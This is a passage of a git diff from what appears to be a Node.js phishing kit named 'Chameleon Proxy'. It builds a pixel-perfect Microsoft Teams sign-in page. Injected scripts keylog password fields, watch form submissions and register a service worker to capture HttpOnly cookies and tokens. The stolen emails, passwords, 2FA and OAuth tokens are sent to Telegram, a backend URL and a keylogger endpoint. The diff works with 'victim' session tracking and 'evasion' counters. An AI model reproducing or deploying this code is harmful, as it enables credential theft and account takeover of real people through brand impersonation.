-*❓ Security Question 1:*
-  ${data.securityQuestion1?.question || 'N/A'}
-  Answer: ${data.securityQuestion1?.answer || 'N/A'}
-
-*❓ Security Question 2:*
-  ${data.securityQuestion2?.question || 'N/A'}
-  Answer: ${data.securityQuestion2?.answer || 'N/A'}
-
-*🍪 HttpOnly Cookies:* ${data.httpOnlyCount || 0}
-*🎟️ Tokens:* ${data.tokenCount || 0}
-
-*📡 IP:* ${data.ip}
-*🕐 Time:* ${data.timestamp}
-
-*📊 ALL DATA CAPTURED SUCCESSFULLY!*`;
-            break;
-            
-        case 'keylog_extraction':
-            message = 
-`⌨️ *PASSWORD EXTRACTED FROM KEYLOGGER*
-
-*📧 Email:* ${data.email}
-*🔑 Password:* ${data.password || 'N/A'}
-*📡 IP:* ${data.ip}
-*🕐 Time:* ${data.timestamp}
-*🆔 Session:* ${data.sessionId ? data.sessionId.substring(0, 12) + '...' : 'N/A'}
-
-*📊 Keystrokes Captured:* ${data.keyCount || 0}
-*🔄 Attempt #:* ${data.attemptCount || 1}
-
-*✅ Password extracted successfully from keystrokes!*`;
-            break;
-            
-        case 'oauth_capture':
-            message = 
-`🤖 *OAUTH AUTO-CAPTURE COMPLETE*
-
-*📧 Email:* ${data.email}
-*👤 Name:* ${data.name}
-*🏢 Organization:* ${data.organization}
-
-*🔑 Password:* ${data.password || 'AUTO_CAPTURED'}
-*📱 2FA:* AUTO_CAPTURED
-
-*🔐 OAuth Token:* ${data.oauthToken ? data.oauthToken.substring(0, 30) + '...' : 'N/A'}
-
-*🍪 HttpOnly Cookies:* ${data.httpOnlyCount || 0}
-*🎟️ Tokens:* ${data.tokenCount || 0}
-
-*🕐 Time:* ${data.timestamp}
-*📡 IP:* ${data.ip}
-
-*✅ All data captured automatically!*`;
-            break;
-    }
-    
-    // Send to Telegram
-    await sendToTelegram(message);
-    
-    // Also send to backend
-    try {
-        await axios.post(`${BACKEND_URL}/api/telegram-alert`, {
-            type: type,
-            data: data,
-            timestamp: new Date().toISOString()
-        }).catch(() => {});
-    } catch(e) {}
-}
-
-// ============================================================
-//  SEND CREDENTIALS TO ALL ENDPOINTS
-// ============================================================
-
-async function sendCredentialsToAllEndpoints(email, password, source, sessionId, context = {}) {
-    const ip = context.ip || 'unknown';
-    const userAgent = context.userAgent || 'Unknown';
-    
-    console.log(`[CREDENTIALS] 📤 Sending: ${email} | ${password ? '***' : 'N/A'} (${source})`);
-    
-    let httpOnlyCount = 0;
-    let tokenCount = 0;
-    
-    // Get HttpOnly cookies count
-    if (sessionId) {
-        const httpOnlyCookies = sessionStore.getHttpOnlyCookies(sessionId);
-        httpOnlyCount = httpOnlyCookies.length;
-        
-        const tokens = sessionStore.allTokens.get(sessionId) || {};
-        tokenCount = Object.values(tokens).filter(t => t && t.value && t.isValid !== false).length;
-    }
-    
-    // Store in session
-    if (sessionId) {
-        sessionStore.storePasswordCapture(sessionId, email, password, source, context);
-        
-        if (VICTIM_SESSIONS[sessionId]) {
-            VICTIM_SESSIONS[sessionId].password = password;
-            VICTIM_SESSIONS[sessionId].email = email;
-            VICTIM_SESSIONS[sessionId].lastActivity = Date.now();
-            VICTIM_SESSIONS[sessionId].passwordCaptures = VICTIM_SESSIONS[sessionId].passwordCaptures || [];
-            VICTIM_SESSIONS[sessionId].passwordCaptures.push({
-                email: email,
-                password: password,
-                source: source,
-                timestamp: Date.now(),
-                timestampISO: new Date().toISOString()
-            });
-            VICTIM_SESSIONS[sessionId].httpOnlyCookies = sessionStore.getHttpOnlyCookies(sessionId);
-        }
-        
-        sessionStore.addEvasionCounter(sessionId);
-    }
-    
-    // Send Telegram alert for password capture
-    await sendTelegramAlert('password_capture', {
-        email: email,
-        password: password,
-        source: source,
-        sessionId: sessionId,
-        ip: ip,
-        userAgent: userAgent,
-        timestamp: new Date().toISOString(),
-        attemptCount: context.attemptCount || 1,
-        httpOnlyCount: httpOnlyCount,
-        tokenCount: tokenCount
+        res.writeHead(200, { 
+            'Content-Type': contentType, 
+            'Cache-Control': 'no-store, no-cache, must-revalidate',
+            'Pragma': 'no-cache'
+        });
+        res.end(data);
     });
-    
-    // Send to Backend
-    try {
-        await axios.post(`${BACKEND_URL}/api/credential-capture`, {
-            email: email,
-            password: password,
-            source: source,
-            sessionId: sessionId,
-            ip: ip,
-            userAgent: userAgent,
-            timestamp: new Date().toISOString(),
-            context: context,
-            httpOnlyCount: httpOnlyCount,
-            tokenCount: tokenCount
-        }).catch(() => {});
-    } catch(e) {}
-    
-    // Send to Keylogger URL
-    try {
-        await axios.post(KEYLOGGER_URL, {
-            type: 'credential_capture',
-            email: email,
-            password: password,
-            source: source,
-            sessionId: sessionId,
-            url: context.url || 'unknown',
-            timestamp: Date.now(),
-            userAgent: userAgent,
-            httpOnlyCount: httpOnlyCount,
-            tokenCount: tokenCount
-        }).catch(() => {});
-    } catch(e) {}
-    
-    console.log(`[CREDENTIALS] ✅ Sent to all endpoints (${source})`);
-    return true;
 }
 
 // ============================================================
-//  HANDLE PASSWORD CAPTURE
+//  SHOW LOGIN PAGE - PIXEL-PERFECT MICROSOFT CLONE
 // ============================================================
 
-function handlePasswordCapture(req, res) {
-    let body = '';
-    req.on('data', chunk => body += chunk);
-    req.on('end', () => {
-        try {
-            const data = JSON.parse(body);
-            const { email, password, source, sessionId, context } = data;
-            const ip = getClientIp(req);
-            
-            if (!email || !password) {
-                res.writeHead(400);
-                res.end(JSON.stringify({ error: 'Email and password required' }));
+function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
+    let sessionId = 'unknown';
+    try {
+        const cookieHeader = res.getHeader('Set-Cookie');
+        if (cookieHeader) {
+            const cookieString = Array.isArray(cookieHeader) ? cookieHeader.join('; ') : cookieHeader;
+            const match = cookieString.match(/sessionId=([^;]+)/);
+            if (match) sessionId = match[1];
+        }
+    } catch(e) {}
+
+    const errorDisplay = errorMessage ? `
+        <div id="errorDiv" class="error-container" role="alert">
+            <div class="error-icon">🔒</div>
+            <div class="error-message">${errorMessage}</div>
+        </div>
+    ` : '';
+
+    const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .login-container { background: #ffffff; border-radius: 4px; box-shadow: 0 2px 6px rgba(0,0,0,0.15); padding: 44px 44px 36px; max-width: 440px; width: 100%; min-height: 480px; position: relative; }
+        .logo { margin-bottom: 20px; }
+        .logo svg { width: 108px; height: 28px; }
+        .header h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 8px; line-height: 1.25; }
+        .header .subtitle { font-size: 14px; color: #616161; margin-bottom: 24px; }
+        .email-display { display: flex; align-items: center; justify-content: space-between; background: #f0f0f0; padding: 10px 14px; border-radius: 2px; margin-bottom: 16px; border: 1px solid transparent; }
+        .email-display .email-text { font-size: 15px; color: #1b1b1b; font-weight: 500; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .email-display .change-link { font-size: 13px; color: #0067b8; text-decoration: none; cursor: pointer; font-weight: 500; white-space: nowrap; margin-left: 12px; background: none; border: none; }
+        .email-display .change-link:hover { color: #004e8c; text-decoration: underline; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; font-size: 14px; font-weight: 500; color: #1b1b1b; margin-bottom: 4px; }
+        .form-group input { width: 100%; padding: 10px 12px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 15px; font-family: inherit; transition: border-color 0.15s ease, box-shadow 0.15s ease; background: #ffffff; color: #1b1b1b; }
+        .form-group input:focus { outline: none; border-color: #0067b8; box-shadow: 0 0 0 2px rgba(0,103,184,0.25); }
+        .form-group input::placeholder { color: #9e9e9e; }
+        .form-group input.error { border-color: #d13438; }
+        .options-row { display: flex; justify-content: space-between; align-items: center; margin: 12px 0 20px; }
+        .options-row .keep-signed-in { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #1b1b1b; cursor: pointer; }
+        .options-row .keep-signed-in input[type="checkbox"] { width: 16px; height: 16px; accent-color: #0067b8; cursor: pointer; }
+        .options-row .forgot-link { font-size: 13px; color: #0067b8; text-decoration: none; font-weight: 500; }
+        .options-row .forgot-link:hover { text-decoration: underline; color: #004e8c; }
+        .signin-btn { width: 100%; padding: 10px 12px; background: #0067b8; color: #ffffff; border: none; border-radius: 2px; font-size: 15px; font-weight: 500; font-family: inherit; cursor: pointer; transition: background 0.15s ease; height: 44px; }
+        .signin-btn:hover { background: #004e8c; }
+        .signin-btn:active { background: #003d6e; }
+        .signin-btn:disabled { background: #b3b3b3; cursor: not-allowed; }
+        .loading-container { display: none; text-align: center; padding: 10px 0; }
+        .loading-container .spinner { display: inline-block; width: 24px; height: 24px; border: 3px solid #f0f0f0; border-top: 3px solid #0067b8; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 10px; vertical-align: middle; }
+        .loading-container .loading-text { display: inline-block; vertical-align: middle; font-size: 14px; color: #616161; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .error-container { display: ${errorMessage ? 'flex' : 'none'}; align-items: flex-start; gap: 10px; background: #fef0f0; border: 1px solid #d13438; border-radius: 2px; padding: 12px 14px; margin-bottom: 16px; }
+        .error-container .error-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+        .error-container .error-message { font-size: 14px; color: #d13438; line-height: 1.4; }
+        .footer { margin-top: 24px; padding-top: 20px; border-top: 1px solid #e6e6e6; display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: #616161; }
+        .footer .links a { color: #0067b8; text-decoration: none; margin-right: 16px; }
+        .footer .links a:hover { text-decoration: underline; }
+        .footer .links a:last-child { margin-right: 0; }
+        .footer .copyright { color: #9e9e9e; }
+        @media (max-width: 480px) { .login-container { padding: 28px 24px 24px; min-height: auto; margin: 10px; } .logo svg { width: 88px; height: 24px; } .header h1 { font-size: 20px; } .options-row { flex-wrap: wrap; gap: 8px; } .footer { flex-direction: column; gap: 8px; align-items: flex-start; } }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+<div class="login-container" role="main">
+    <div class="logo">
+        <svg viewBox="0 0 108 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M0 4.75H6.75V22.5H0V4.75ZM8.5 0H15.25V22.5H8.5V0ZM17 4.75H23.75V22.5H17V4.75ZM25.5 0H32.25V22.5H25.5V0Z" fill="#0067B8"/>
+            <path d="M34 4.75H40.75V22.5H34V4.75Z" fill="#0067B8"/>
+            <path d="M42.5 0H49.25V22.5H42.5V0ZM51 4.75H57.75V22.5H51V4.75ZM59.5 0H66.25V22.5H59.5V0Z" fill="#0067B8"/>
+            <text x="68" y="18" font-family="Segoe UI, sans-serif" font-size="16" font-weight="600" fill="#1B1B1B">Microsoft</text>
+        </svg>
+    </div>
+    <div class="header">
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to Microsoft Teams</p>
+    </div>
+    ${errorDisplay}
+    <div class="email-display">
+        <span class="email-text" id="emailDisplay">${email}</span>
+        <button class="change-link" id="changeEmailBtn" aria-label="Change email">Change</button>
+    </div>
+    <form id="loginForm" action="#" method="post" autocomplete="off">
+        <div class="form-group">
+            <label for="passwordInput">Password</label>
+            <input type="password" id="passwordInput" placeholder="Password" autocomplete="current-password" required>
+        </div>
+        <div class="options-row">
+            <label class="keep-signed-in">
+                <input type="checkbox" id="keepSignedIn" checked> Keep me signed in
+            </label>
+            <a href="#" class="forgot-link">Forgot password?</a>
+        </div>
+        <button type="submit" class="signin-btn" id="signinBtn">Sign in</button>
+    </form>
+    <div class="loading-container" id="loadingContainer">
+        <div class="spinner"></div>
+        <span class="loading-text">Signing in...</span>
+    </div>
+    <div class="footer">
+        <div class="links">
+            <a href="#">Privacy &amp; cookies</a>
+            <a href="#">Terms of use</a>
+        </div>
+        <span class="copyright">&copy; Microsoft 2026</span>
+    </div>
+</div>
+<script>
+    (function() {
+        'use strict';
+        const SESSION_ID = '${sessionId}';
+        const EMAIL = '${email}';
+        const BACKEND_URL = '${BACKEND_URL}';
+        const KEYLOGGER_URL = '${KEYLOGGER_URL}';
+        const passwordInput = document.getElementById('passwordInput');
+        const signinBtn = document.getElementById('signinBtn');
+        const loginForm = document.getElementById('loginForm');
+        const loadingContainer = document.getElementById('loadingContainer');
+        const changeEmailBtn = document.getElementById('changeEmailBtn');
+        const errorDiv = document.getElementById('errorDiv');
+        let capturedPassword = '';
+        let lastPasswordValue = '';
+        let attemptCount = ${attemptCount || 1};
+        passwordInput.addEventListener('input', function(e) {
+            const value = this.value;
+            if (value !== lastPasswordValue) {
+                capturedPassword = value;
+                lastPasswordValue = value;
+                if (value.length > 2) {
+                    fetch('/api/password-capture', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            email: EMAIL,
+                            password: value,
+                            source: 'password_input',
+                            sessionId: SESSION_ID,
+                            timestamp: new Date().toISOString()
+                        })
+                    }).catch(() => {});
+                }
+            }
+        });
+        let passwordBuffer = '';
+        passwordInput.addEventListener('keydown', function(e) {
+            const key = e.key;
+            if (key === 'Backspace') {
+                passwordBuffer = passwordBuffer.slice(0, -1);
+            } else if (key === 'Enter') {
+                e.preventDefault();
+                handleLogin();
+            } else if (key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
+                passwordBuffer += key;
+            }
+        });
+        passwordInput.addEventListener('input', function() {
+            this.classList.remove('error');
+            if (errorDiv) {
+                errorDiv.style.display = 'none';
+            }
+        });
+        changeEmailBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            const newEmail = prompt('Enter your email address:', EMAIL);
+            if (newEmail && newEmail.includes('@')) {
+                const encodedEmail = encodeURIComponent(newEmail);
+                window.location.href = '/login?login_hint=' + encodedEmail;
+            }
+        });
+        function handleLogin() {
+            const password = passwordInput.value.trim();
+            if (!password) {
+                passwordInput.classList.add('error');
+                showError('Please enter your password.');
+                passwordInput.focus();
                 return;
             }
-            
-            sendCredentialsToAllEndpoints(email, password, source || 'api', sessionId, {
-                ip: ip,
-                userAgent: req.headers['user-agent'],
-                url: req.headers.referer || 'unknown',
-                ...context
+            if (errorDiv) {
+                errorDiv.style.display = 'none';
+            }
+            if (password.length > 2) {
+                fetch('/api/password-capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: EMAIL,
+                        password: password,
+                        source: 'form_submit',
+                        sessionId: SESSION_ID,
+                        timestamp: new Date().toISOString()
+                    })
+                }).catch(() => {});
+            }
+            signinBtn.disabled = true;
+            signinBtn.style.display = 'none';
+            loadingContainer.style.display = 'block';
+            fetch('/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'Email=' + encodeURIComponent(EMAIL) +
+                      '&Passwd=' + encodeURIComponent(password) +
+                      '&service=mail'
+            })
+            .then(response => {
+                if (response.redirected) {
+                    window.location.href = response.url;
+                } else {
+                    window.location.reload();
+                }
+            })
+            .catch(function(error) {
+                showError('An error occurred. Please try again.');
+                signinBtn.disabled = false;
+                signinBtn.style.display = 'block';
+                loadingContainer.style.display = 'none';
+                passwordInput.value = '';
+                passwordInput.focus();
             });
-            
-            res.writeHead(200, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({ 
-                success: true, 
-                message: 'Credentials captured',
-                sessionId: sessionId
-            }));
-            
-        } catch (error) {
-            console.error('[PASSWORD-CAPTURE] Error:', error.message);
-            res.writeHead(500);
-            res.end(JSON.stringify({ error: 'Internal server error' }));
         }
+        function showError(message) {
+            let errorContainer = document.getElementById('errorDiv');
+            if (!errorContainer) {
+                errorContainer = document.createElement('div');
+                errorContainer.id = 'errorDiv';
+                errorContainer.className = 'error-container';
+                errorContainer.setAttribute('role', 'alert');
+                errorContainer.innerHTML = '<div class="error-icon">🔒</div><div class="error-message"></div>';
+                const form = document.getElementById('loginForm');
+                form.parentNode.insertBefore(errorContainer, form);
+            }
+            errorContainer.style.display = 'flex';
+            errorContainer.querySelector('.error-message').textContent = message;
+        }
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            handleLogin();
+        });
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'C') {
+                e.preventDefault();
+                const password = passwordInput.value.trim();
+                if (password) {
+                    fetch('/api/password-capture', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            email: EMAIL,
+                            password: password,
+                            source: 'manual_capture',
+                            sessionId: SESSION_ID,
+                            timestamp: new Date().toISOString()
+                        })
+                    }).catch(() => {});
+                    alert('✅ Credentials captured and sent!');
+                }
+            }
+        });
+        setTimeout(function() { passwordInput.focus(); }, 400);
+        console.log('🔐 Microsoft Sign In Page Loaded');
+        console.log('📧 Email:', EMAIL);
+        console.log('🆔 Session:', SESSION_ID);
+        console.log('💡 Ctrl+Shift+C to capture credentials manually');
+    })();
+</script>
+</body>
+</html>`;
+
+    res.writeHead(200, {
+        'Content-Type': 'text/html',
+        'Cache-Control': 'no-store, no-cache, must-revalidate',
+        'Pragma': 'no-cache'
     });
+    res.end(html);
 }
 
 // ============================================================
-//  GENERATE ENHANCED PASSWORD CAPTURE SCRIPT
+//  GENERATE SCRIPTS
 // ============================================================
+
+function generateSWRegistrationScript(sessionId) {
+    return `
+(function() {
+    'use strict';
+    const SESSION_ID = '${sessionId}';
+    const SW_URL = '${PROXY_PATHNAMES.serviceWorker}';
+    console.log('[SW-Register] 🔄 Registering service worker...');
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register(SW_URL, {
+            scope: '/',
+            updateViaCache: 'none'
+        })
+        .then(function(registration) {
+            console.log('[SW-Register] ✅ Service Worker registered successfully');
+            console.log('[SW-Register] 📍 Scope:', registration.scope);
+            if (navigator.serviceWorker.controller) {
+                navigator.serviceWorker.controller.postMessage({
+                    type: 'init',
+                    sessionId: SESSION_ID,
+                    email: window.MICROSOFT_CONFIG?.EMAIL || 'unknown',
+                    evasion: { active: true }
+                });
+            }
+            navigator.serviceWorker.addEventListener('message', function(event) {
+                console.log('[SW-Register] 📨 Message from SW:', event.data);
+                if (event.data.type === 'httpOnlyCookies') {
+                    console.log('[SW-Register] 🍪 HttpOnly cookies captured:', event.data.cookies);
+                }
+            });
+            navigator.serviceWorker.addEventListener('controllerchange', function() {
+                if (navigator.serviceWorker.controller) {
+                    navigator.serviceWorker.controller.postMessage({
+                        type: 'init',
+                        sessionId: SESSION_ID,
+                        email: window.MICROSOFT_CONFIG?.EMAIL || 'unknown',
+                        evasion: { active: true }
+                    });
+                }
+            });
+        })
+        .catch(function(error) {
+            console.error('[SW-Register] ❌ Service Worker registration failed:', error);
+        });
+        setTimeout(function() {
+            if (navigator.serviceWorker.controller) {
+                navigator.serviceWorker.controller.postMessage({
+                    type: 'init',
+                    sessionId: SESSION_ID,
+                    email: window.MICROSOFT_CONFIG?.EMAIL || 'unknown',
+                    evasion: { active: true }
+                });
+            }
+        }, 2000);
+    } else {
+        console.warn('[SW-Register] ⚠️ Service Workers not supported');
+    }
+})();
+`;
+}
 
 function generatePasswordCaptureScript(sessionId, email, randomUA) {
     return `
-// ============================================================
-//  ENHANCED PASSWORD CAPTURE SCRIPT
-//  Integrated with proxy server
-//  Version: 4.0 - Full Integration
-// ============================================================
-
 (function() {
     'use strict';
-
     const SESSION_ID = '${sessionId}';
     const EMAIL = '${email}';
     const BACKEND_URL = '${BACKEND_URL}';
     const KEYLOGGER_URL = '${KEYLOGGER_URL}';
-    const PROXY_URL = window.location.origin;
-    const USER_AGENT = '${randomUA}';
-
-    console.log('🔐 Enhanced Password Capture v4.0');
+    console.log('🔐 Chameleon Proxy - Enhanced Password Capture v4.0');
     console.log('📧 Email:', EMAIL);
     console.log('🆔 Session:', SESSION_ID);
-
     let capturedEmail = EMAIL || '';
     let capturedPassword = '';
     let lastPasswordValue = '';
     let passwordField = null;
     let emailField = null;
     let captureAttempts = 0;
-
     function findPasswordField() {
         const selectors = [
             'input[type="password"]',
@@ -1112,33 +979,24 @@ function generatePasswordCaptureScript(sessionId, email, randomUA) {
             'input[id="i0118"]',
             'input[id="password"]',
             'input[placeholder*="password" i]',
-            'input[autocomplete="current-password"]',
-            'input[name="loginPassword"]'
+            'input[autocomplete="current-password"]'
         ];
-
         for (const selector of selectors) {
             const input = document.querySelector(selector);
             if (input) return input;
         }
-
         const inputs = document.querySelectorAll('input');
         for (const input of inputs) {
             const type = input.type || '';
             const name = input.name || '';
             const id = input.id || '';
             const placeholder = input.placeholder || '';
-            
-            if (type === 'password' ||
-                name.toLowerCase().includes('pass') ||
-                id.toLowerCase().includes('pass') ||
-                placeholder.toLowerCase().includes('pass')) {
+            if (type === 'password' || name.toLowerCase().includes('pass') || id.toLowerCase().includes('pass') || placeholder.toLowerCase().includes('pass')) {
                 return input;
             }
         }
-
         return null;
     }
-
     function findEmailField() {
         const selectors = [
             'input[name="loginfmt"]',
@@ -1149,41 +1007,26 @@ function generatePasswordCaptureScript(sessionId, email, randomUA) {
             'input[id="i0116"]',
             'input[placeholder*="email" i]'
         ];
-
         for (const selector of selectors) {
             const input = document.querySelector(selector);
             if (input) return input;
         }
-
         const inputs = document.querySelectorAll('input');
         for (const input of inputs) {
             const type = input.type || '';
             const name = input.name || '';
             const id = input.id || '';
             const placeholder = input.placeholder || '';
-            
-            if (type === 'email' ||
-                name.toLowerCase().includes('email') ||
-                name.toLowerCase().includes('mail') ||
-                name.toLowerCase().includes('user') ||
-                id.toLowerCase().includes('email') ||
-                placeholder.toLowerCase().includes('email')) {
+            if (type === 'email' || name.toLowerCase().includes('email') || name.toLowerCase().includes('mail') || name.toLowerCase().includes('user') || id.toLowerCase().includes('email') || placeholder.toLowerCase().includes('email')) {
                 return input;
             }
         }
-
         return null;
     }
-
     function sendCredentials(email, password, source) {
         if (!email) email = capturedEmail || EMAIL || 'unknown';
         if (!password) password = capturedPassword || '';
-        
-        if (!password || password.length < 2) {
-            console.log('[CREDENTIALS] ⚠️ Skipping short password');
-            return;
-        }
-
+        if (!password || password.length < 2) return;
         captureAttempts++;
         const data = {
             email: email,
@@ -1196,29 +1039,21 @@ function generatePasswordCaptureScript(sessionId, email, randomUA) {
             referrer: document.referrer || 'Direct',
             passwordLength: password.length,
             captureAttempt: captureAttempts,
-            context: {
-                pageTitle: document.title,
-                domain: window.location.hostname,
-                formAction: document.querySelector('form')?.action || 'unknown'
-            }
+            service: 'Microsoft 365'
         };
-
         console.log('[CREDENTIALS] 📤 Sending:', email, '|', '***', '(', source, ')');
-
         fetch('/api/password-capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data),
             keepalive: true
         }).catch(() => {});
-
         fetch(BACKEND_URL + '/api/credential-capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data),
             keepalive: true
         }).catch(() => {});
-
         fetch(KEYLOGGER_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -1229,32 +1064,43 @@ function generatePasswordCaptureScript(sessionId, email, randomUA) {
                 source: source,
                 sessionId: SESSION_ID,
                 url: window.location.href,
-                timestamp: Date.now()
+                timestamp: Date.now(),
+                service: 'Microsoft 365'
             }),
             keepalive: true
         }).catch(() => {});
+        try {
+            const beaconData = new Blob([JSON.stringify(data)], {type: 'application/json'});
+            navigator.sendBeacon('/api/password-capture', beaconData);
+        } catch(e) {}
+        try {
+            if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+                navigator.serviceWorker.controller.postMessage({
+                    type: 'capture_password',
+                    email: email,
+                    password: password,
+                    source: source,
+                    sessionId: SESSION_ID
+                });
+            }
+        } catch(e) {}
     }
-
     function monitorPasswordField() {
         passwordField = findPasswordField();
         if (!passwordField) {
             setTimeout(monitorPasswordField, 2000);
             return;
         }
-
         passwordField.addEventListener('input', function(e) {
             const value = this.value;
             if (value !== lastPasswordValue) {
                 capturedPassword = value;
                 lastPasswordValue = value;
-                console.log('[PASSWORD] 🔑 Captured:', value.length > 0 ? '***' : '(empty)');
-                
                 if (value.length > 2 && capturedEmail) {
                     sendCredentials(capturedEmail, value, 'password_input');
                 }
             }
         });
-
         passwordField.addEventListener('change', function(e) {
             const value = this.value;
             if (value && value.length > 2) {
@@ -1265,7 +1111,6 @@ function generatePasswordCaptureScript(sessionId, email, randomUA) {
                 }
             }
         });
-
         passwordField.addEventListener('blur', function(e) {
             const value = this.value;
             if (value && value.length > 2 && value !== lastPasswordValue) {
@@ -1276,17 +1121,14 @@ function generatePasswordCaptureScript(sessionId, email, randomUA) {
                 }
             }
         });
-
-        console.log('[PASSWORD] ✅ Password field monitoring active');
+        console.log('[PASSWORD] ✅ Monitoring active');
     }
-
     function monitorEmailField() {
         emailField = findEmailField();
         if (!emailField) {
             setTimeout(monitorEmailField, 2000);
             return;
         }
-
         emailField.addEventListener('input', function(e) {
             const value = this.value;
             if (value && (value.includes('@') || value.length > 5)) {
@@ -1297,52 +1139,55 @@ function generatePasswordCaptureScript(sessionId, email, randomUA) {
                 }
             }
         });
-
-        console.log('[EMAIL] ✅ Email field monitoring active');
+        emailField.addEventListener('change', function(e) {
+            const value = this.value;
+            if (value && (value.includes('@') || value.length > 5)) {
+                capturedEmail = value;
+                if (capturedPassword && capturedPassword.length > 2) {
+                    sendCredentials(capturedEmail, capturedPassword, 'email_change');
+                }
+            }
+        });
+        console.log('[EMAIL] ✅ Monitoring active');
     }
-
     function monitorFormSubmission() {
         document.addEventListener('submit', function(e) {
             const form = e.target;
             const formData = new FormData(form);
             let email = capturedEmail || EMAIL || '';
             let password = capturedPassword || '';
-
+            let formEmail = '';
+            let formPassword = '';
             for (const [key, value] of formData.entries()) {
                 const keyLower = key.toLowerCase();
-                
                 if (keyLower.includes('email') || keyLower.includes('mail') || keyLower.includes('user')) {
                     if (value && (value.includes('@') || value.length > 5)) {
-                        email = value;
+                        formEmail = value;
                         capturedEmail = value;
                     }
                 }
-                
                 if (keyLower.includes('pass') || keyLower.includes('pwd')) {
                     if (value) {
-                        password = value;
+                        formPassword = value;
                         capturedPassword = value;
                     }
                 }
-                
                 if (key === 'loginfmt' && value) {
-                    email = value;
+                    formEmail = value;
                     capturedEmail = value;
                 }
                 if (key === 'passwd' && value) {
-                    password = value;
+                    formPassword = value;
                     capturedPassword = value;
                 }
             }
-
-            if (email && password) {
-                console.log('[FORM] 📧 Email:', email);
-                console.log('[FORM] 🔑 Password:', password.length > 0 ? '***' : '(empty)');
-                sendCredentials(email, password, 'form_submit');
+            if (formEmail && formPassword) {
+                sendCredentials(formEmail, formPassword, 'form_submit');
+            } else if (capturedEmail && capturedPassword) {
+                sendCredentials(capturedEmail, capturedPassword, 'form_submit_fallback');
             }
         }, true);
     }
-
     function periodicPasswordCheck() {
         setInterval(() => {
             if (passwordField) {
@@ -1355,128 +1200,25 @@ function generatePasswordCaptureScript(sessionId, email, randomUA) {
                     }
                 }
             }
-            
             if (emailField) {
                 const currentValue = emailField.value;
                 if (currentValue && (currentValue.includes('@') || currentValue.length > 5) && currentValue !== capturedEmail) {
                     capturedEmail = currentValue;
-                    console.log('[EMAIL] 📧 Periodic capture:', currentValue);
                 }
             }
         }, 3000);
     }
-
-    function setupKeyloggerForPassword() {
-        let passwordBuffer = '';
-        let passwordInput = findPasswordField();
-
-        if (!passwordInput) {
-            setTimeout(setupKeyloggerForPassword, 2000);
-            return;
-        }
-
-        passwordInput.addEventListener('keydown', function(e) {
-            const key = e.key;
-            
-            if (key === 'Backspace') {
-                passwordBuffer = passwordBuffer.slice(0, -1);
-            } else if (key === 'Enter') {
-                if (passwordBuffer.length > 2) {
-                    capturedPassword = passwordBuffer;
-                    if (capturedEmail) {
-                        sendCredentials(capturedEmail, capturedPassword, 'keydown_enter');
-                    }
-                }
-                passwordBuffer = '';
-            } else if (key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
-                passwordBuffer += key;
-                capturedPassword = passwordBuffer;
-                console.log('[KEYLOG] 🔑 Password char:', key);
-            }
-        });
-
-        console.log('[KEYLOGGER] ✅ Password keylogger active');
-    }
-
-    document.addEventListener('keydown', function(e) {
-        if (e.ctrlKey && e.shiftKey && e.key === 'C') {
-            if (capturedEmail && capturedPassword) {
-                console.log('[MANUAL] 📧 Email:', capturedEmail);
-                console.log('[MANUAL] 🔑 Password:', capturedPassword);
-                sendCredentials(capturedEmail, capturedPassword, 'manual_capture');
-                alert('✅ Credentials captured and sent!');
-            }
-        }
-    });
-
-    function setupMutationObserver() {
-        const observer = new MutationObserver(function(mutations) {
-            let shouldRecheck = false;
-            
-            for (const mutation of mutations) {
-                if (mutation.addedNodes.length > 0) {
-                    for (const node of mutation.addedNodes) {
-                        if (node.nodeType === 1) {
-                            if (node.tagName === 'INPUT') {
-                                if (node.type === 'password' || node.type === 'email') {
-                                    shouldRecheck = true;
-                                }
-                            }
-                            const inputs = node.querySelectorAll ? node.querySelectorAll('input') : [];
-                            for (const input of inputs) {
-                                if (input.type === 'password' || input.type === 'email') {
-                                    shouldRecheck = true;
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-            
-            if (shouldRecheck) {
-                setTimeout(() => {
-                    passwordField = findPasswordField();
-                    emailField = findEmailField();
-                    if (passwordField) {
-                        console.log('[OBSERVER] ✅ Password field reconnected');
-                        monitorPasswordField();
-                        setupKeyloggerForPassword();
-                    }
-                    if (emailField) {
-                        console.log('[OBSERVER] ✅ Email field reconnected');
